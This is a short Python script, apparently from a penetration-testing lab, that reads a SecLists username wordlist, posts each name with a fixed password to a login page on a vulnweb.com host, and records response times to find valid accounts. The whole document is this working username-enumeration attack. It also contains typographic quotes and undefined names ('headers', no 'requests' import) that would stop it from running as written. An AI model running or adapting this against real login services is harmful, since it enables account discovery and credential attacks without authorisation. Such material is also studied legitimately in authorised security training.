def unpack(fline):
  userid = fline
  passwd = 'foobar'
  return userid, passwd

def do_req(url, userid, passwd, headers):
  data = {"userid": userid, "passwd": passwd, "submit": "submit"}
  res = requests.post(url, headers=headers, data=data)
  print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))
  return res.text

with open(‘/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt’) as fh:
  for fline in fh:
    if fline.startswith("#"):
      continue
    userid, passwd = unpack(fline.rstrip())
    print("[-] Checking account {} {}".format(userid, passwd))
    res = do_req(‘http://vulnweb.com/login’, userid, passwd, headers)
